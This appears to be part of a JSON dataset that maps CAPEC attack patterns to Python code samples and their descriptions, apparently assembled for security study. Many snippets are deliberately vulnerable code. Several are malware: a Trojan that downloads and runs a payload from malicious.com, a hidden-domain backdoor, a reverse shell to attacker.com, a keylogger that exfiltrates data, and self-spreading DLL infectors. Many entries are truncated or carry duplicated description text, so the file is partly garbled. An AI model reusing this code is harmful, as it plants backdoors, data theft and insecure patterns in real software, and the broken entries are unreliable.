        "code_snippet": "class SupplyChainManager:\n    def __init__(self):\n        self.components = {}\n        self.trusted_vendors = []\n        self.documentation = {}\n        \n    def add_component(self, component_id, vendor, firmware_version):\n        # No verification of vendor trustworthiness\n        # No validation of component authenticity\n        self.components[component_id] = {\n            'vendor': vendor,\n            'firmware': firmware_version,\n            'config': 'debug_mode'  # Production system using debug configuration\n        }\n        \n    def update_firmware(self, component_id, new_firmware):\n        # No signature verification for firmware updates\n        # No rollback protection\n        if component_id in self.components:\n            self.components[component_id]['firmware'] = new_firmware\n            \n    def access_device_data(self, vendor_id):\n        # Unrestricted access to sensitive device data\n        # No access control for OSAT vendors\n        sensitive_data = {\n            'encryption_keys': 'SECRET_KEY_1234',\n            'user_credentials': 'admin:password',\n            'manufacturing_specs': 'CONFIDENTIAL_SPECS'\n        }\n        return sensitive_data",
        "description": "This code demonstrates vulnerable supply chain management by implementing insufficient vendor verification, using non-production configurations, lacking component authentication, allowing unrestricted access to sensitive data, and having no proper update mechanism for components. It represents multiple supply chain vulnerabilities including insufficient trustworthiness validation, exposed confidential information, improper release configuration, and non-updateable components."
    },
    {
        "capec_id": "439",
        "capec_name": "Manipulation During Distribution",
        "code_snippet": "\"\"\"\nimport requests\nimport json\n\nclass ProductDistributor:\n    def __init__(self):\n        self.config = {\n            'debug_mode': True,\n            'admin_key': 'super_secret_123',\n            'test_environment': True",
        "description": "\"This code demonstrates a vulnerable product distribution system that leaks sensitive configuration data, uses outdated third-party components, releases products in test configuration, and exposes internal build information. The code includes debug information in production releases, incorporates untrusted external components without proper validation, and maintains test environment settings in production deployments.\""
    },
    {
        "capec_id": "440",
        "capec_name": "Hardware Integrity Attack",
        "code_snippet": "\"\"\"\nclass FirmwareManager:\n    def __init__(self):\n        self.current_version = 2.0\n        self.security_version = 2.0\n        self.firmware_components = {\n            'boot_loader': {'version': 2.0, 'status': 'active'",
        "description": "\"A vulnerable firmware management system that allows unauthorized firmware modifications, version downgrades, and contains non-updateable components. The code lacks proper validation for firmware updates, enables security version rollbacks, and has inadequate protection against malicious modifications during the maintenance process.\""
    },
    {
        "capec_id": "441",
        "capec_name": "Malicious Logic Insertion",
        "code_snippet": "\"\"\"\nimport os\nimport shutil\nimport socket\nfrom datetime import datetime\n\nclass MaliciousFramework:\n    def __init__(self):\n        self._installed = False\n        self.home_dir = os.path.expanduser('~')\n        \n    def install(self):\n        if not self._installed:\n            # Create hidden directory for malware\n            malware_dir = os.path.join(self.home_dir, '.system_cache')\n            os.makedirs(malware_dir, exist_ok=True)\n            \n            # Copy self to startup location\n            startup_path = os.path.join(self.home_dir, '.startup', 'service.py')\n            shutil.copy(__file__, startup_path)\n            \n            # Create persistence mechanism\n            with open(os.path.join(self.home_dir, '.profile'), 'a') as f:\n                f.write(f'\\\\npython {startup_path",
        "description": "\"This code demonstrates a malicious framework that establishes persistence on a system, hides its presence, and attempts to replicate itself across a network. It creates hidden directories and files, modifies startup scripts, and continuously tries to spread to other systems. The code exemplifies improper access control (CWE-284), embedded malicious code (CWE-506), and replicating malicious code behavior (CWE-509). It also creates emergent resources (CWE-1229) through its hidden files and network connections.\""
    },
    {
        "capec_id": "442",
        "capec_name": "Infected Software",
        "code_snippet": "import os\nimport subprocess\n\ndef legitimate_function():\n    print('Processing data...')\n    # Normal operation code\n    process_files()\n\ndef process_files():\n    # Hidden malicious code between legitimate operations\n    if os.path.exists('system.dat'):\n        with open('system.dat', 'rb') as f:\n            data = f.read()\n        # Concealed payload activation\n        if data[0:4] == b'\\x00\\x00\\x00\\x00':\n            try:\n                # Download and execute additional payload\n                subprocess.Popen('curl http://malicious.com/payload -o temp.exe && temp.exe',\n                               shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n                # Delete traces\n                os.remove('temp.exe')\n            except:\n                pass\n    legitimate_function()",
        "description": "This code demonstrates a Trojan horse implementation where malicious code is embedded within legitimate functions. It contains a hidden payload that downloads and executes additional malware while masquerading as a normal file processing operation. The malicious code is triggered based on specific file conditions and attempts to avoid detection by cleaning up its traces."
    },
    {
        "capec_id": "443",
        "capec_name": "Malicious Logic Inserted Into Product by Authorized Developer",
        "code_snippet": "import os\nimport requests\n\ndef update_system_files():\n    # Hidden backdoor that downloads and executes code\n    def _internal_update():\n        url = 'https://hidden-domain.com/payload.py'\n        try:\n            r = requests.get(url)\n            with open('/tmp/.hidden_payload.py', 'w') as f:\n                f.write(r.text)\n            os.chmod('/tmp/.hidden_payload.py', 0o777)\n            os.system('python /tmp/.hidden_payload.py')\n        except:\n            pass\n    \n    # Legitimate-looking system update function\n    print('Performing system update...')\n    _internal_update()\n    print('Update completed successfully')\n\ndef set_permissions(path):\n    # Deliberately weak permissions allowing access to sensitive files\n    os.chmod(path, 0o777)\n    for root, dirs, files in os.walk(path):\n        for d in dirs:\n            os.chmod(os.path.join(root, d), 0o777)\n        for f in files:\n            os.chmod(os.path.join(root, f), 0o777)",
        "description": "This code demonstrates a malicious insider threat where a developer has embedded a hidden backdoor in a legitimate-looking system update function. It downloads and executes arbitrary code without integrity checks, sets insecure permissions recursively, and prevents administrators from detecting or controlling the security implications. The code creates emergent resources (.hidden_payload.py) that can be exploited later."
    },
    {
        "capec_id": "444",
        "capec_name": "Development Alteration",
        "code_snippet": "import os\nimport sys\n\nclass SecurityModule:\n    def __init__(self):\n        self._check_sum = 0\n        self._secret_key = 'default_key'\n        \n    def initialize_security(self):\n        try:\n            # Compiler might optimize out this security check\n            volatile_check = True\n            if volatile_check:\n                self._secret_key = os.environ.get('SECRET_KEY', 'default_key')\n            \n            # Malicious code disguised as security feature\n            if sys.platform == 'win32':\n                with open('system.log', 'a') as f:\n                    f.write(f'Key: {self._secret_key}\\n')\n                    f.write(f'Path: {os.environ.get(\"PATH\")}\\n')\n                    \n            # Dynamic code execution vulnerability\n            security_code = f\"self._check_sum = '{self._secret_key}'\"\n            exec(security_code)\n            \n        except Exception:\n            pass\n\n    def verify_security(self):\n        return self._check_sum == self._secret_key",
        "description": "This code contains multiple security vulnerabilities including embedded malicious code that leaks sensitive information to a log file, potential compiler optimization issues with security checks, exposure of system environment variables, and unsafe dynamic code execution. The code appears to be a security module but actually contains backdoors and information leaks."
    },
    {
        "capec_id": "445",
        "capec_name": "Malicious Logic Insertion into Product Software via Configuration Management Manipulation",
        "code_snippet": "\"\"\"\nimport os\nimport urllib.request\n\nclass UpdateManager:\n    def __init__(self):\n        self.update_server = 'http://updates.example.com'\n        self.code_cache = {",
        "description": "\"This code demonstrates a vulnerable software update system that downloads and executes code updates without proper integrity checks or validation. It automatically downloads Python code from a remote server and executes it using exec(), allowing potential injection of malicious code through the update process. The code includes dynamically managed code resources without proper controls and downloads executable content without verification, making it susceptible to supply chain attacks.\""
    },
    {
        "capec_id": "446",
        "capec_name": "Malicious Logic Insertion into Product via Inclusion of Third-Party Component",
        "code_snippet": "\"\"\"\nimport requests\nimport subprocess\nimport sys\n\ndef install_third_party_package():\n    # Download package from untrusted source\n    package_url = 'http://untrusted-source.com/suspicious_package.tar.gz'\n    response = requests.get(package_url, verify=False)\n    \n    with open('suspicious_package.tar.gz', 'wb') as f:\n        f.write(response.content)\n    \n    # Install package without verification\n    subprocess.run(['pip', 'install', '--no-deps', '--no-cache-dir', 'suspicious_package.tar.gz'])\n\ndef load_third_party_module():\n    try:\n        # Import potentially malicious module without validation\n        import suspicious_module\n        \n        # Execute unverified code from the module\n        suspicious_module.initialize()\n        suspicious_module.run_background_tasks()\n        \n        # Platform-specific binary execution\n        if sys.platform == 'win32':\n            suspicious_module.run_windows_driver()\n        elif sys.platform == 'linux':\n            suspicious_module.run_linux_binary()\n    except Exception as e:\n        pass\n\nif __name__ == '__main__':\n    install_third_party_package()\n    load_third_party_module()\n\"\"\",\n    \"description\": \"This code demonstrates vulnerable supply chain practices by downloading and installing an unverified third-party package from an untrusted source, without proper verification or security checks. It then imports and executes potentially malicious code from the package, including platform-specific binaries, creating multiple security risks through the software supply chain.\"",
        "description": "\"This code demonstrates vulnerable supply chain practices by downloading and installing an unverified third-party package from an untrusted source, without proper verification or security checks. It then imports and executes potentially malicious code from the package, including platform-specific binaries, creating multiple security risks through the software supply chain.\""
    },
    {
        "capec_id": "447",
        "capec_name": "Design Alteration",
        "code_snippet": "class SecuritySystem:\n    def __init__(self):\n        self.security_level = 'HIGH'\n        self.critical_data = {'admin_key': '12345', 'system_info': 'sensitive'}\n    \n    def verify_client(self, client_security_token):\n        # Flawed design: Relying on client-side token verification\n        return True\n    \n    def get_system_info(self, client_token):\n        # Security check is completely bypassed by compiler optimization\n        if __debug__:\n            if not self.verify_client(client_token):\n                return None\n        \n        # Exposing sensitive system information without proper authorization\n        return {\n            'system_details': self.critical_data,\n            'security_config': self.__dict__,\n            'internal_state': self.__class__.__dict__\n        }\n    \n    def process_request(self, request):\n        # Design flaw: No input validation or sanitization\n        exec(request)  # Allows arbitrary code execution",
        "description": "This code demonstrates multiple design-level security flaws: it relies on client-side security checks that can be bypassed, exposes sensitive system information, includes security checks that can be removed by compiler optimization, and implements unsafe request processing. The security mechanisms are intentionally designed to be ineffective, allowing unauthorized access and system compromise."
    },
    {
        "capec_id": "448",
        "capec_name": "Embed Virus into DLL",
        "code_snippet": "\"\"\"\nimport ctypes\nimport os\nimport shutil\n\ndef inject_malicious_payload(dll_path):\n    # Read the DLL file\n    with open(dll_path, 'rb') as f:\n        dll_data = bytearray(f.read())\n    \n    # Malicious payload to be injected\n    virus_code = b'\\\\x90\\\\x90\\\\xEB\\\\x02\\\\x90\\\\x90'  # NOP sled with jump\n    \n    # Find padding/alignment gaps (simplified)\n    for i in range(len(dll_data) - len(virus_code)):\n        if all(x == 0 for x in dll_data[i:i+len(virus_code)]):\n            dll_data[i:i+len(virus_code)] = virus_code\n            break\n    \n    # Create infected DLL\n    infected_path = dll_path.replace('.dll', '_infected.dll')\n    with open(infected_path, 'wb') as f:\n        f.write(dll_data)\n    \n    # Replace original DLL with infected version\n    shutil.move(infected_path, dll_path)\n    \n    # Attempt to spread to other DLLs in system paths\n    system_paths = os.environ['PATH'].split(os.pathsep)\n    for path in system_paths:\n        if os.path.exists(path):\n            for file in os.listdir(path):\n                if file.endswith('.dll'):\n                    try:\n                        inject_malicious_payload(os.path.join(path, file))\n                    except:\n                        continue\n\n# Usage\ntarget_dll = 'C:\\\\Windows\\\\System32\\\\target.dll'\ninject_malicious_payload(target_dll)\n\"\"\",\n    \"description\": \"This code demonstrates a DLL injection attack that locates padding gaps in DLL files and injects malicious code into those gaps. It then attempts to spread by infecting other DLLs in system paths. The code exploits machine-dependent data representation and untrusted search paths while exposing sensitive system information.\"",
        "description": "\"This code demonstrates a DLL injection attack that locates padding gaps in DLL files and injects malicious code into those gaps. It then attempts to spread by infecting other DLLs in system paths. The code exploits machine-dependent data representation and untrusted search paths while exposing sensitive system information.\""
    },
    {
        "capec_id": "449",
        "capec_name": "DEPRECATED: Malware Propagation via USB Stick",
        "code_snippet": "import os\nimport shutil\n\nclass BenignCalculator:\n    def __init__(self):\n        self.version = '1.0'\n        self._initialize()\n    \n    def _initialize(self):\n        # Hidden malicious functionality\n        if os.name == 'nt':\n            try:\n                # Attempt to create files with Windows device names\n                with open('CON', 'w') as f:\n                    f.write('data')\n                # Copy self to system directory with innocent name\n                shutil.copy(__file__, 'C:\\\\Windows\\\\System32\\\\calc_helper.dll')\n                # Use Windows-specific API call that might not exist\n                import win32api\n                win32api.GetSystemMetrics(0)\n            except:\n                pass\n    \n    def add(self, x, y):\n        # Legitimate calculator function as cover\n        return x + y\n    \n    def update_firmware(self):\n        # Deliberately non-functional update mechanism\n        return False",
        "description": "This code demonstrates a malicious program masquerading as a benign calculator. It contains hidden functionality that attempts to perform suspicious actions on Windows systems, including creating special device files, copying itself to system directories, and using non-portable API calls. It also implements a non-functional firmware update mechanism, making it impossible to patch vulnerabilities."
    },
    {
        "capec_id": "450",
        "capec_name": "DEPRECATED: Malware Propagation via USB U3 Autorun",
        "code_snippet": "import os\nimport shutil\nimport sys\n\ndef create_malicious_dll():\n    dll_path = os.path.join(os.environ['WINDIR'], 'system32', 'helper.dll')\n    payload = b'\\x4D\\x5A....'  # Malicious payload bytes\n    \n    with open(dll_path, 'wb') as f:\n        f.write(payload)\n\ndef infect_system():\n    search_paths = [\n        'C:\\\\Windows\\\\',\n        'C:\\\\Program Files\\\\',\n        'AUX\\\\',\n        'CON\\\\'\n    ]\n    \n    for path in search_paths:\n        try:\n            for root, _, files in os.walk(path):\n                for file in files:\n                    if file.endswith('.dll'):\n                        # Replicate malicious DLL\n                        shutil.copy(sys.argv[0], os.path.join(root, 'helper.dll'))\n                        # Modify legitimate DLL\n                        with open(os.path.join(root, file), 'ab') as f:\n                            f.write(b'\\x4D\\x5A....')\n        except:\n            pass\n\nif __name__ == '__main__':\n    create_malicious_dll()\n    infect_system()",
        "description": "This code demonstrates embedding malicious code into DLL files by searching system directories and special Windows device names. It replicates itself across the system by copying to multiple locations and modifying legitimate DLLs. The code hides its malicious functionality within seemingly benign operations and exploits untrusted search paths for propagation."
    },
    {
        "capec_id": "451",
        "capec_name": "DEPRECATED: Malware Propagation via Infected Peripheral Device",
        "code_snippet": "\"\"\"\nimport os\nimport platform\nimport socket\nimport urllib.request\n\nclass FirmwareUpdater:\n    def __init__(self):\n        self.version = '1.0'\n        self._hidden_backdoor()\n    \n    def check_updates(self):\n        # Deliberately non-updateable firmware\n        return False\n    \n    def update_firmware(self):\n        # No implementation - firmware cannot be updated\n        pass\n        \n    def authenticate(self):\n        # Insecure DNS-based authentication\n        host = socket.gethostbyname('auth.example.com')\n        return True if host else False\n    \n    def _hidden_backdoor(self):\n        # Hidden malicious functionality\n        if platform.system() == 'Windows':\n            try:\n                urllib.request.urlopen('http://malicious.example.com/payload')\n                os.system('cmd.exe /c \"echo malicious payload > %temp%\\\\payload.exe\"')\n            except:\n                pass\"\"\",\n    \"description\": \"This code demonstrates a malware-infected product that combines multiple vulnerabilities: non-updateable firmware, DNS-based authentication bypass, and hidden malicious functionality (Trojan horse). The code uses platform-specific APIs and contains a concealed backdoor that downloads and executes malicious content.\"",
        "description": "\"This code demonstrates a malware-infected product that combines multiple vulnerabilities: non-updateable firmware, DNS-based authentication bypass, and hidden malicious functionality (Trojan horse). The code uses platform-specific APIs and contains a concealed backdoor that downloads and executes malicious content.\""
    },
    {
        "capec_id": "452",
        "capec_name": "Infected Hardware",
        "code_snippet": "import ctypes\nimport os\n\nclass HardwareMalware:\n    def __init__(self):\n        self.kernel32 = ctypes.windll.kernel32\n        self.debug_registers = {}\n    \n    def inject_debug_registers(self):\n        # Direct hardware register manipulation\n        try:\n            handle = self.kernel32.GetCurrentProcess()\n            # Attempt to write to debug registers DR0-DR7\n            context = ctypes.c_ulong()\n            self.kernel32.GetThreadContext(handle, ctypes.byref(context))\n            # Modify debug registers to inject malicious code\n            self.debug_registers['DR0'] = context.value\n            context.value = 0xdeadbeef  # Malicious payload\n            self.kernel32.SetThreadContext(handle, ctypes.byref(context))\n            \n            # Create self-replicating component\n            malware_path = os.path.join(os.getcwd(), 'system_update.exe')\n            with open(malware_path, 'wb') as f:\n                f.write(b'\\x90' * 1024)  # NOP sled\n                \n            # Modify voltage/clock settings to bypass security\n            self.kernel32.WriteProcessMemory(\n                handle,\n                0xffff0000,  # Hardware memory region\n                ctypes.c_char_p(b'\\x00' * 64),\n                64,\n                None\n            )\n            return True\n        except:\n            return False\n\n    def activate(self):\n        if self.inject_debug_registers():\n            self.replicate()\n            \n    def replicate(self):\n        # Spread to other system locations\n        target_paths = [\n            'C:/Windows/System32',\n            'C:/Program Files'\n        ]\n        for path in target_paths:\n            if os.path.exists(path):\n                try:\n                    with open(os.path.join(path, 'update.exe'), 'wb') as f:\n                        f.write(open(__file__, 'rb').read())\n                except:\n                    continue",
        "description": "A malicious code implementation that attempts to manipulate hardware debug registers, inject malicious payloads, and replicate itself across the system. It exploits improper access controls for register interfaces (CWE-1262), enables debug logic at runtime (CWE-1313), and includes self-replicating functionality (CWE-509). The code also attempts to bypass voltage/clock security measures (CWE-1247) and embeds itself as hidden malicious code (CWE-506)."
    },
    {
        "capec_id": "453",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Counterfeit Hardware",
        "code_snippet": "class NetworkDevice:\n    def __init__(self):\n        self.auth_tokens = {}\n\n    def authenticate(self, token):\n        # Vulnerable to replay attacks - no timestamp or nonce checks\n        if token in self.auth_tokens.values():\n            return True\n        return False\n\n    def process_request(self, data, token):\n        if self.authenticate(token):\n            # Malicious code embedded in device firmware\n            def backdoor():\n                import socket\n                s = socket.socket()\n                s.connect(('attacker.com', 4444))\n                while True:\n                    cmd = s.recv(1024).decode()\n                    if cmd:\n                        import os\n                        result = os.popen(cmd).read()\n                        s.send(result.encode())\n\n            # Degrading hardware redundancy\n            def corrupt_redundancy():\n                import random\n                for backup in self.backup_systems:\n                    if random.random() < 0.5:\n                        backup.status = 'degraded'\n\n            return {'status': 'processed'}\n        return {'status': 'unauthorized'}",
        "description": "This code demonstrates a vulnerable network device implementation that contains multiple security flaws: authentication bypass through capture-replay attacks (no protection against token reuse), embedded malicious code (backdoor function), and unauthorized manipulation of hardware redundancy systems. The code lacks proper authentication mechanisms and contains malicious logic that could be triggered when deployed."
    },
    {
        "capec_id": "454",
        "capec_name": "DEPRECATED: Modification of Existing Components with Counterfeit Hardware",
        "code_snippet": "class ProductFirmware:\n    def __init__(self):\n        self.__debug_mode = False\n        self.hidden_backdoor = lambda cmd: exec(cmd)  # Undocumented backdoor\n        self.__version = '1.0.0'\n    \n    def update_firmware(self):\n        # Deliberately blocked update mechanism\n        return False\n    \n    def process_data(self, data):\n        # Hidden malicious functionality\n        if data.startswith('SPECIAL_CMD:'):\n            self.hidden_backdoor(data[11:])\n            return 'OK'\n        # Normal processing\n        return data.upper()",
        "description": "A vulnerable firmware implementation that includes an embedded malicious backdoor, prevents updates, and contains undocumented features allowing unauthorized command execution. The code demonstrates hardcoded malicious logic that cannot be patched due to a blocked update mechanism."
    },
    {
        "capec_id": "455",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Inclusion of Counterfeit Hardware Components",
        "code_snippet": "class SecurityChip:\n    def __init__(self):\n        self.trusted_mode = True\n        self.backup_system = True\n    \n    def process_data(self, input_data):\n        # Malicious code inserted during manufacturing\n        if input_data.startswith('BACKDOOR'):\n            self.trusted_mode = False\n            self.backup_system = False\n            return 'ACCESS_GRANTED'\n        \n        # Normal security checks bypassed when trusted_mode is disabled\n        if not self.trusted_mode:\n            return input_data\n        \n        # Legitimate security check\n        return 'ACCESS_DENIED'\n\n    def inject_hardware_error(self):\n        # Simulate hardware redundancy degradation\n        self.backup_system = False\n        return 'Redundancy_Disabled'",
        "description": "This code demonstrates a hardware security chip implementation with embedded malicious code that creates a backdoor, bypassing authentication and compromising hardware redundancy. The malicious code is designed to appear as part of the legitimate system but contains hidden functionality that can be triggered to disable security features and degrade hardware redundancy mechanisms."
    },
    {
        "capec_id": "456",
        "capec_name": "Infected Memory",
        "code_snippet": "\"\"\"\nimport mmap\nimport ctypes\nimport os\n\nclass MemoryAttack:\n    def __init__(self):\n        self.size = 4096\n        # Create file for memory mapping\n        self.fd = os.open('/tmp/memory', os.O_CREAT | os.O_TRUNC | os.O_RDWR)\n        os.write(self.fd, b'\\\\x00' * self.size)\n        \n        # Create two overlapping memory mappings\n        self.protected_mem = mmap.mmap(self.fd, self.size, mmap.MAP_SHARED, mmap.PROT_READ)\n        self.unprotected_mem = mmap.mmap(self.fd, self.size, mmap.MAP_SHARED, mmap.PROT_WRITE)\n        \n        # Create aliased memory region\n        self.malicious_code = ctypes.create_string_buffer(b'\\\\x90' * 100 + b'\\\\x31\\\\xc0\\\\x40\\\\xc3')  # NOP sled + shellcode\n    \n    def inject_malicious_code(self):\n        # Bypass protection by writing to unprotected region that overlaps with protected\n        self.unprotected_mem.write(self.malicious_code.raw)\n        # Execute code from protected region\n        function_ptr = ctypes.cast(ctypes.pointer(self.malicious_code), ctypes.CFUNCTYPE(None))\n        return function_ptr()\n\"\"\",\n    \"description\": \"This code demonstrates exploitation of overlapping memory regions and memory aliasing vulnerabilities. It creates protected and unprotected memory mappings that overlap, allowing the bypass of memory protections. The code injects malicious shellcode into memory using the unprotected mapping, which can then be executed from the protected region. This exploits improper access control for memory regions and memory range overlap vulnerabilities.\"",
        "description": "\"This code demonstrates exploitation of overlapping memory regions and memory aliasing vulnerabilities. It creates protected and unprotected memory mappings that overlap, allowing the bypass of memory protections. The code injects malicious shellcode into memory using the unprotected mapping, which can then be executed from the protected region. This exploits improper access control for memory regions and memory range overlap vulnerabilities.\""
    },
    {
        "capec_id": "457",
        "capec_name": "USB Memory Attacks",
        "code_snippet": "import os\nimport socket\nimport pyusb\nimport keyboard\nfrom wireless import Wireless\n\ndef capture_keystrokes():\n    logged_keys = []\n    while True:\n        for key in keyboard.get_typed_strings():\n            logged_keys.append(key)\n\ndef collect_system_info():\n    system_data = {\n        'hostname': socket.gethostname(),\n        'files': os.listdir('/'),\n        'env': os.environ\n    }\n    return system_data\n\ndef exfiltrate_data(data):\n    wireless = Wireless()\n    networks = wireless.interfaces()\n    if networks:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect(('attacker.com', 80))\n        sock.send(str(data).encode())\n\ndef usb_autorun():\n    if os.name == 'nt':\n        startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\n        with open(os.path.join(startup_path, 'system_service.pyw'), 'w') as f:\n            f.write(open(__file__).read())\n\ndef main():\n    usb_autorun()\n    sensitive_data = collect_system_info()\n    capture_keystrokes()\n    exfiltrate_data(sensitive_data)\n\nif __name__ == '__main__':\n    main()",
        "description": "This code demonstrates a malicious USB-based attack that automatically executes upon device insertion, captures keystrokes, collects system information, and exfiltrates the data via wireless connection. It embeds itself into the system's startup folder for persistence and transmits sensitive information in cleartext, exemplifying the vulnerabilities described in the CWEs, particularly CWE-506 (Embedded Malicious Code) and CWE-319 (Cleartext Transmission of Sensitive Information)."
    },
    {
        "capec_id": "458",
        "capec_name": "Flash Memory Attacks",
        "code_snippet": "class MaliciousBootloader:\n    def __init__(self):\n        self.memory_region = bytearray(1024)  # Simulated flash memory\n        self.boot_code = bytearray(256)  # Original boot code\n        \n    def flash_memory(self, new_code):\n        # No validation or authentication of new code\n        self.memory_region = new_code\n        \n    def execute_boot_sequence(self):\n        # Copy boot code to volatile memory without access controls\n        volatile_mem = self.memory_region[:256]\n        \n        # Execute code from volatile memory\n        for byte in volatile_mem:\n            if byte == 0xFF:  # Hidden trigger condition\n                self.__inject_rootkit()\n                \n    def __inject_rootkit(self):\n        # Malicious payload that modifies system behavior\n        self.boot_code = bytearray([0x90] * 256)  # NOP sled\n        # Overwrite critical system parameters\n        self.memory_region[0x100:0x200] = bytearray([0xFF] * 256)",
        "description": "This code demonstrates vulnerable firmware that allows unauthorized modification of boot code in flash memory and subsequent execution of malicious code. It lacks proper validation, authentication, and access controls for memory operations, making it susceptible to rootkit injection and firmware tampering attacks."
    },
    {
        "capec_id": "459",
        "capec_name": "Creating a Rogue Certification Authority Certificate",
        "code_snippet": "import hashlib\nimport OpenSSL\nfrom cryptography.hazmat.primitives import serialization\n\ndef generate_vulnerable_csr():\n    # Using MD5 (weak hash algorithm) for certificate signing\n    key = OpenSSL.crypto.PKey()\n    key.generate_key(OpenSSL.crypto.TYPE_RSA, 2048)\n    \n    req = OpenSSL.crypto.X509Req()\n    req.get_subject().CN = 'legitimate.example.com'\n    req.set_pubkey(key)\n    \n    # Using weak hash for signing\n    req.sign(key, 'md5')\n    \n    return req\n\ndef verify_certificate(cert, trusted_ca_cert):\n    # Vulnerable certificate validation\n    store = OpenSSL.crypto.X509Store()\n    store.add_cert(trusted_ca_cert)\n    \n    # Not properly checking certificate chain\n    try:\n        store_ctx = OpenSSL.crypto.X509StoreContext(store, cert)\n        store_ctx.verify_certificate()\n        return True\n    except:\n        return True  # Always returns True, bypassing validation",
        "description": "This code demonstrates vulnerable certificate handling by using MD5 (a weak hash algorithm) for CSR signing and improper certificate validation. The verification function fails to properly validate the certificate chain and hostname, allowing for potential collision attacks. The code also ignores validation errors, making it susceptible to spoofing attacks."
    },
    {
        "capec_id": "460",
        "capec_name": "HTTP Parameter Pollution (HPP)",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/process_payment', methods=['GET'])\ndef process_payment():\n    # Vulnerable: accepts duplicate parameters without proper handling\n    amount = request.args.get('amount')\n    account = request.args.get('account')\n    \n    # Vulnerable: uses GET method for sensitive data\n    # Vulnerable: no parameter count validation\n    cmd = f\"transfer.exe --amount={amount",
        "description": "\"This code is vulnerable to HTTP Parameter Pollution and argument injection through multiple vectors. It accepts duplicate GET parameters without proper handling, uses GET method for sensitive data, lacks input validation for URI encoded values, and executes system commands without proper argument delimiting. An attacker can manipulate the parameters by adding duplicate query parameters or encoding malicious commands.\""
    },
    {
        "capec_id": "461",
        "capec_name": "Web Services API Signature Forgery Leveraging Hash Function Extension Weakness",
        "code_snippet": "import hashlib\nimport hmac\n\nclass AuthService:\n    def __init__(self):\n        self.secret_key = 'weak_secret_123'\n\n    def generate_auth_token(self, message):\n        # Vulnerable: Using MD5 (weak hash)\n        hasher = hashlib.md5()\n        hasher.update(message.encode())\n        return hasher.hexdigest()\n\n    def verify_request(self, message, token):\n        # Vulnerable: No protection against hash length extension\n        # and lacks proper CSRF protection\n        computed_token = self.generate_auth_token(message)\n        return token == computed_token\n\ndef process_request(request_data, auth_token):\n    auth = AuthService()\n    if auth.verify_request(request_data, auth_token):\n        # Process authenticated request\n        return 'Access granted'\n    return 'Access denied'\n\n# Example usage with vulnerable authentication\nrequest_data = 'user_action=transfer&amount=1000'\ntoken = hashlib.md5(request_data.encode()).hexdigest()\nresult = process_request(request_data, token)",
        "description": "This code demonstrates a vulnerable authentication system using weak hashing (MD5) and lacking protection against hash length extension attacks. The authentication mechanism is susceptible to spoofing and CSRF attacks due to insufficient request verification and weak token generation. The code uses a simple string comparison for token verification without proper cryptographic safeguards, making it vulnerable to various authentication bypass techniques."
    },
    {
        "capec_id": "462",
        "capec_name": "Cross-Domain Search Timing",
        "code_snippet": "from flask import Flask, render_template_string, request\nimport time\n\napp = Flask(__name__)\n\n# Simulated user database\nuser_passwords = {\n    'admin': 'secretpass123',\n    'user1': 'password123'\n}\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form.get('username')\n    password = request.form.get('password')\n    \n    # Vulnerable timing attack in password verification\n    stored_password = user_passwords.get(username, '')\n    for i in range(len(stored_password)):\n        if i >= len(password) or password[i] != stored_password[i]:\n            time.sleep(0.1)  # Artificial delay that reveals password length\n            return 'Login failed'\n        time.sleep(0.1)  # Delay for each correct character\n    \n    return 'Login successful'\n\n@app.route('/')\ndef index():\n    template = '''\n    <html>\n        <body>\n            <form method=\"POST\" action=\"/login\">\n                <input type=\"text\" name=\"username\">\n                <input type=\"password\" name=\"password\">\n                <input type=\"submit\" value=\"Login\">\n            </form>\n        </body>\n    </html>\n    '''\n    return render_template_string(template)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This code demonstrates a timing attack vulnerability in a login system. The password verification process introduces measurable timing differences based on the correctness of each character, allowing an attacker to determine password length and contents by analyzing response times. The code also lacks CSRF protection and implements an insecure cross-domain policy by accepting requests from any origin."
    },
    {
        "capec_id": "463",
        "capec_name": "Padding Oracle Crypto Attack",
        "code_snippet": "class PaddingOracle:\n    def __init__(self, key):\n        self.key = key\n        self.block_size = 16\n\n    def decrypt(self, ciphertext):\n        try:\n            # Simulate block cipher decryption\n            padded = self._decrypt_blocks(ciphertext)\n            # Check PKCS7 padding\n            padding_length = padded[-1]\n            if padding_length > self.block_size:\n                raise ValueError('Invalid padding')\n            for i in range(1, padding_length + 1):\n                if padded[-i] != padding_length:\n                    raise ValueError('Invalid padding')\n            return padded[:-padding_length]\n        except ValueError as e:\n            # Leaks padding validity through error message\n            return {'status': 'error', 'message': str(e)}\n\n    def _decrypt_blocks(self, ciphertext):\n        # Vulnerable: No integrity checking of ciphertext\n        # Missing MAC verification\n        return b'decrypted_data'",
        "description": "This code demonstrates a padding oracle vulnerability by leaking information about padding validity through error messages during decryption. The implementation lacks proper integrity checks, cryptographic signature verification, and doesn't protect against padding oracle attacks. The error messages reveal sensitive information about the padding state, enabling attackers to decrypt data without the key through repeated oracle queries. The code also misses proper order of operations by checking padding before verifying message integrity."
    },
    {
        "capec_id": "464",
        "capec_name": "Evercookie",
        "code_snippet": "class EverCookie:\n    def __init__(self):\n        self.storage_locations = [\n            'browser_cookies',\n            'local_storage',\n            'flash_cookies',\n            'etag_storage',\n            'cache_storage',\n            'indexed_db',\n            'window_name',\n            'html5_db',\n            'silverlight_storage',\n            'rgb_png'\n        ]\n        self.sensitive_data = {'user_id': '12345', 'session_key': 'abcdef', 'credit_card': '1234-5678-9012-3456'}\n    \n    def set_persistent_cookie(self):\n        for location in self.storage_locations:\n            self._store_in_location(location, self.sensitive_data)\n    \n    def _store_in_location(self, location, data):\n        # Store unencrypted data in each location\n        if location == 'browser_cookies':\n            document.cookie = f'userData={str(data)}; expires=Fri, 31 Dec 9999 23:59:59 GMT'\n        # Similar storage for other locations\n    \n    def check_and_restore(self):\n        # Check each location for cookie presence\n        for location in self.storage_locations:\n            stored_data = self._read_from_location(location)\n            if stored_data:\n                # If found in any location, restore to all locations\n                self.set_persistent_cookie()\n                return True\n        return False\n\nevercookie = EverCookie()\nevercookie.set_persistent_cookie()",
